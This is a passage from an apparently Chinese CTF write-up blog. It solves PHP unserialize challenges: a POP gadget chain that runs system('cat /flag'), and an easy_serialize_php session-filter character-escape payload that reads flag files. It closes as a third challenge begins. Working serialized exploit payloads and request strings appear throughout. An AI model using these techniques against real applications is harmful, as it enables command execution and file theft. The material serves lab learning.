<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Class Rd&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$ending</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$cl</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$poc</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;All matters have concluded&quot;</span>;</span><br><span class="line">      <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;ending);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arg</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt;<span class="variable">$value</span>)</span><br><span class="line">        &#123;</span><br><span class="line">  </span><br><span class="line">          <span class="keyword">if</span>(<span class="variable">$arg</span>[<span class="number">0</span>][<span class="string">&#x27;POC&#x27;</span>]==<span class="string">&quot;1111&quot;</span>)</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;cl-&gt;var1 = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><font style="color:#000000;">先定义了三个变量：ending、c1、poc，且它们都是公有的</font></li>
<li><font style="color:#000000;">之后使用</font><font style="color:#000000;">__destruct</font><font style="color:#000000;">()魔术方法：</font><font style="color:#000000;">当对象被销毁时会触发这个方法</font><ul>
<li><font style="color:#000000;">当对象被销毁后输出：All matters have concluded</font></li>
<li><font style="color:#000000;">结束代码</font></li>
</ul>
</li>
<li><font style="color:#000000;">使用 _call()魔术方法：当调用一个不可访问的对象时会触发这个方法</font><ul>
<li><font style="color:#000000;">这里它遍历参数，如果有某个键为 POC 且值为”1111“，则把 c1 的 var1 属性设置为”system“</font></li>
</ul>
</li>
</ul>
<p><font style="color:#000000;"></font></p>
<p><font style="color:#000000;">Class Poc</font></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Poc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payload</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;payload = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fun = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"><span class="variable">$paylaod</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Have you genuinely accomplished what you set out to do?&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$paylaod</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><font style="color:#000000;">先定义了两个变量：playload、fun，且它们都是公有的</font></li>
<li><font style="color:#000000;">之后使用 set 魔术方法（当给一个不可访问的属性赋值时会触发这个方法），把输入的属性值分别赋值给 playload 和 fun</font></li>
<li><font style="color:#000000;">定义 getflag 函数,形参为 playload 的值</font><ul>
<li><font style="color:#000000;">输出：Have you genuinely accomplished what you set out to do?</font></li>
<li><font style="color:#000000;">用 file_get_contents($paylaod)尝试获取$playload 里的文件</font></li>
</ul>
</li>
</ul>
<p><font style="color:#000000;"></font></p>
<p><font style="color:#000000;">Class Er</font></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Er</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$symbol</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Flag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;symbol = True;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$value</span>(<span class="variable language_">$this</span>-&gt;Flag);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><font style="color:#000000;">先定义了两个变量：symbol、Flag，且它们都是公有的</font></li>
<li><font style="color:#000000;">使用构造函数，把 symbol 属性变为 True</font></li>
<li><font style="color:#000000;">使用 set 魔术方法它会将传入的值作为函数调用，并将Flag属性作为参数传入这个函数</font></li>
</ul>
<p><font style="color:#000000;"></font></p>
<p><font style="color:#000000;">Class Ha</font></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ha</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;start1.<span class="string">&quot;__construct&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;start2===<span class="string">&quot;11111&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;start1-&gt;<span class="title function_ invoke__">Love</span>(<span class="variable">$this</span>-&gt;start);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You are Good!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><font style="color:#000000;">先定义了三个变量：start、start1、start2，且它们都是公有的</font></li>
<li><font style="color:#000000;">使用构造函数</font><ul>
<li><font style="color:#000000;">输出 start1 属性的值并换行</font></li>
</ul>
</li>
<li><font style="color:#000000;">使用__destruct()魔术方法（当调用对象被销毁时触发这个魔术方法）</font><ul>
<li><font style="color:#000000;">如果 start2 属性的值为 11111，则调用 start1 的 Love 方法</font></li>
<li><font style="color:#000000;">并传入 start 属性作为参数</font></li>
<li><font style="color:#000000;">然后输出You are Good!</font></li>
</ul>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Ha_rde_r&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Ha_rde_r&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;You are Silly goose!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><font style="color:#000000;">检查Ha_rde_r是否为随机值，</font></li>
<li><font style="color:#000000;">如果为真则对Ha_rde_r 进行反序列化操作</font></li>
<li><font style="color:#000000;">否则输出You are Silly goose!</font></li>
</ul>
<p><font style="color:#000000;"></font></p>
<p><font style="color:#000000;">分析代码后发现这道题入口是 Ha 类里面（毕竟 start 都写在里面了）</font></p>
<p><font style="color:#000000;">之后触发__destruct()魔术方法进入 Love 语句。</font></p>
<p><font style="color:#000000;">使得其触发__call 魔术方法，然后给start赋值（ [‘POC’&#x3D;&gt;‘1111’] ）</font></p>
<p><font style="color:#000000;">之后 c1 中的 var1触发__set 魔术方法，之后它的 value就成为了system</font></p>
<p><font style="color:#000000;">修改$Flag就可以修改执行的命令了</font></p>
<p><font style="color:#000000;">构造以下脚本：</font></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Class Rd&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ending</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cl</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$poc</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Poc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$playload</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Er</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$symbol</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Flag</span>=<span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ha</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start2</span>=<span class="string">&quot;11111&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Ha</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;start1=<span class="keyword">new</span> <span class="title class_">Rd</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;start=[<span class="string">&#x27;POC&#x27;</span>=&gt;<span class="string">&#x27;1111&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>-&gt;start1-&gt;cl=<span class="keyword">new</span> <span class="title class_">Er</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">先按照题目的内容写几个类和对象（其中 Flag 要赋值为 ‘cat &#x2F;flag’，之后要用到 system 函数输出）。从 Ha 入手，由于从 c1 在 Rd 内，所以先给 a 中 start1 用类 Rd 赋值，并把其中键 POC 对应的值赋值为 “1111“,之后用 Er 类给 c1 赋值，之后输出 a。这样就满足条件了。</font></p>
<p><font style="color:#000000;">输出结果为</font></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:2:&quot;Ha&quot;:3:&#123;s:5:&quot;start&quot;;a:1:&#123;s:3:&quot;POC&quot;;s:4:&quot;1111&quot;;&#125;s:6:&quot;start1&quot;;O:2:&quot;Rd&quot;:3:&#123;s:6:&quot;ending&quot;;N;s:2:&quot;cl&quot;;O:2:&quot;Er&quot;:2:&#123;s:6:&quot;symbol&quot;;N;s:4:&quot;Flag&quot;;s:9:&quot;cat /flag&quot;;&#125;s:3:&quot;poc&quot;;N;&#125;s:6:&quot;start2&quot;;s:5:&quot;11111&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">传入参数</font></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?Ha_rde_r=O:2:&quot;Ha&quot;:3:&#123;s:5:&quot;start&quot;;a:1:&#123;s:3:&quot;POC&quot;;s:4:&quot;1111&quot;;&#125;s:6:&quot;start1&quot;;O:2:&quot;Rd&quot;:3:&#123;s:6:&quot;ending&quot;;N;s:2:&quot;cl&quot;;O:2:&quot;Er&quot;:2:&#123;s:6:&quot;symbol&quot;;N;s:4:&quot;Flag&quot;;s:9:&quot;cat /flag&quot;;&#125;s:3:&quot;poc&quot;;N;&#125;s:6:&quot;start2&quot;;s:5:&quot;11111&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">拿到 flag</font></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737513460231-deb60d72-66b2-4c9c-b4ca-4d748f21d207.png"></p>
<h2 id="（三）-安洵杯-2019-easy-serialize-php"><a href="#（三）-安洵杯-2019-easy-serialize-php" class="headerlink" title="（三）[安洵杯 2019]easy_serialize_php"></a><font style="color:#000000;">（三）</font><font style="color:#000000;">[安洵杯 2019]easy_serialize_php</font></h2><p><font style="color:#000000;">进入靶场发现这个连接</font></p>
<h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737528784678-2dd6ad78-1996-46b4-9ef1-b02d878e3521.png"></h2><p><font style="color:#000000;">点进入发现是一串 PHP 代码</font></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737528891440-f39ba9da-f8d9-4c83-9687-ac38e5d02f25.png"></p>
<p><font style="color:#000000;">注意到：</font></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737529440871-a0f46fae-8c14-4861-b69a-4cffd7f35684.png"></p>
<p><font style="color:#000000;">进去之后注意到可疑文件</font><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737529464933-0c1808aa-ce5f-46ae-8f21-a29d42a23647.png"></p>
<p><font style="color:#000000;">下面还有这一段代码，存在反序列化，应该就是入口了</font></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737529555759-cb2d90b5-7859-4998-b696-6d5adf24ff32.png"></p>
<p><font style="color:#000000;">先尝试把 f 赋值为 show_image,之后出现以下界面</font></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737529522386-4dc771fa-6d1d-4a84-8507-587948e47919.png"></p>
<p><font style="color:#000000;">没有头绪，先分析代码吧</font></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">GET 传参</font></p>
<p><font style="color:#000000;"></font></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">把php、flag、php5、php4和flig 替换为为空字符串</font></p>
<p><font style="color:#000000;"></font></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">对$_SESSION 重新赋值，user 对应 guest，function 对应$function</font></p>
<p><font style="color:#000000;"></font></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">如果 function 为 0，则输出该页面</font></p>
<p><font style="color:#000000;"></font></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">GET 传参 img_path，如果 img_path 为 0，则对guest_img.png 进行 base64 加密，否则就对 img_path 先进行 base64 加密，再进行 sha1 加密</font></p>
<p><font style="color:#000000;"></font></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>);</span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">对$_SESSION 序列化的值进行过滤并赋值给serialize_info </font></p>
<p><font style="color:#000000;"></font></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">最后就是对 function 的判断</font></p>
<ul>
<li><font style="color:#000000;">如果 function 的值为highlight_file，则输出该页面</font></li>
<li><font style="color:#000000;">如果 function 的值为 phpinfo，则输出该 PHP 代码的信息</font></li>
<li><font style="color:#000000;">如果 function的值为 show_image 则把serialize_info 进行反序列化并赋值给 userinfo，并输出 base64 解密后的 userinfo 的 img。</font></li>
</ul>
<p><font style="color:#000000;"></font></p>
<p><font style="color:#000000;">所以本体的思路为：</font></p>
<p><font style="color:#000000;">该 PHP 代码会将userinfo中的[‘img’]值做base64解码，然后吧提到的整个文件读入一个字符串中，所以我们就要构造img的值，让代码读出内容，经过上文的分析，想要修改img的值可以通过设置img_path，或者修改userinfo[‘img’]的内容</font></p>
<p><font style="color:#000000;">首先看修改img_path</font></p>
<p><font style="color:#000000;">这个方法有一个小问题，修改img_path，传入的内容会被base64和sha1加密，然而，高亮文件内容时只做了base64的解密，没有 sha1 解密，所以修改img_path是无法读到文件的，所以只能修改userinfo[‘img’] 的内容</font></p>
<p><font style="color:#000000;">userinfo[‘img’]的内容由_SESSION组成，所以我们可以修改user和function，考虑到有过滤，可以采用反序列化字符逃逸来构造SESSION[‘img’]的值，其中ZDBnM19mMWFnLnBocA&#x3D;&#x3D;是 d0g3_f1ag.php 的 base64 编码后的结果</font></p>
<p><font style="color:#000000;">关于本题的键值逃逸</font></p>
<ul>
<li><font style="color:#000000;">因为序列化的字符串是严格的，对应的格式不能错，比如s:4:“name”,那s:4就必须有一个字符串长度是4的否则就往后要。</font></li>
<li><font style="color:#000000;">并且反序列化会把多余的字符串当垃圾处理，在花括号内的就是正确的，花括号外的就都被扔掉。</font></li>
</ul>
<p><font style="color:#000000;">先构造img属性</font></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737533856994-7dab4b74-deae-47b9-9baa-38dfb2e449d2.png"></p>
<p><font style="color:#000000;">即</font></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;; </span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">之后我们要确定_SESSION[ ] 里面的东西：</font></p>
<p><font style="color:#000000;">原字符串：</font></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:7:&quot;phpflag&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">经过filter过滤后phpflag就会被替换成空字符串</font></p>
<p><font style="color:#000000;">所以 s:7:“phpflag”就变成了 s:7:””</font></p>
<ul>
<li><font style="color:#000000;">但是这里会出现问题，因为这里要求的字符串的长度为7，但是这里却是空字符串。所以它会向后索取字符串。直到长度正好为7。细心的话，可以看到 “;s:48: 这个字符串的长度正好为7</font></li>
</ul>
<p><font style="color:#000000;">当phpflag被替换成空字符串时，原本的键值对就变成：</font></p>
<ul>
<li><font style="color:#000000;">第一个变量的名： s:7:””;s:48:”;</font></li>
<li><font style="color:#000000;">第一个变量的值： s:1:“1”;</font></li>
<li><font style="color:#000000;">第二个变量的名： s:3:“img”;</font></li>
<li><font style="color:#000000;">第二个变量的值： s:20:“ZDBnM19mMWFnLnBocA&#x3D;&#x3D;”;</font></li>
</ul>
<p><font style="color:#000000;">再加上PHP序列化的严格规定，会把后面多余的字符串丢弃。就变成了：</font></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">所以构造 playload:</font></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[phpflag]=;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737535582456-f7751974-76ce-4244-8b8b-acfd1f05c952.png"></p>
<p><font style="color:#000000;">但是页面源代码出现了这个，所以在进行对&#x2F;d0g3_fllllllag base64 加密</font></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737535582402-5bc666a5-f79a-40e5-8d81-0d2a4fe79f4d.png"></p>
<p><font style="color:#000000;">所以最终 playload 为</font></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://node7.anna.nssctf.cn:21451/index.php?f=show_image</span><br><span class="line">_SESSION[phpflag]=;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737535703721-547eefe4-059f-470b-9a88-40651d8cf4a3.png"></p>
<h2 id="（四）-第五空间-2021-pklovecloud"><a href="#（四）-第五空间-2021-pklovecloud" class="headerlink" title="（四）[第五空间 2021]pklovecloud"></a><font style="color:#000000;">（四）</font><font style="color:#000000;">[第五空间 2021]pklovecloud</font></h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737540928424-8c312bde-7fef-464f-add1-0975c2871ed3.png"></p>
<p><font style="color:#000000;">分析代码</font></p>
